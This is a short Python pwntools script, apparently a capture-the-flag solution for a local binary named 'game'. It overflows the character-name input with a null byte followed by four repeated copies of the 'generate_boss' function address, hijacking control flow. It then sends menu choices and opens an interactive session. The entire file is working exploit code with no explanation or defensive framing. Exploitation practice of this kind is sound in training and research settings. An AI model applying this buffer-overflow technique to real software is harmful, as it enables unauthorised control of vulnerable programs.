from pwn import *

# RUN GAME
p = process("./game")

# GDB
#context.terminal = ["terminator", "-e"]
#gdb.attach(p)

# Get address of 'generate_boss' func.
e = ELF("./game")
generate_boss = e.symbols["generate_boss"]

# Name
p.sendline("MAT\0" + p32(generate_boss)*4)
# Class
p.sendline("3")
# HP
p.sendline("30")
# Strength
p.sendline("0")

log.info("-1 is our secret action.")

p.interactive()

p.close()
